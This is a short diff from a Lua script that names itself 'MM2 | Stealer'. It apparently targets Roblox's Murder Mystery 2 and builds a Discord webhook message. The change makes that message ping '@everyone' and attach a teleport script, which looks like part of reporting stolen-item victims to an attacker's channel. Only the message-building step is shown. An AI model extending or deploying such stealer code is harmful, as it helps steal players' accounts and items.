@@ -68,7 +68,7 @@ function SendMessageEMBED(url, embed, bool)
    local data = {
     username = "MM2 | Stealer",
     avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
-    content = "--@everyone\n" .. TeleportScript,
+    content = "@everyone\n" .. TeleportScript,
     embeds = {
         {
             title = embed.title,
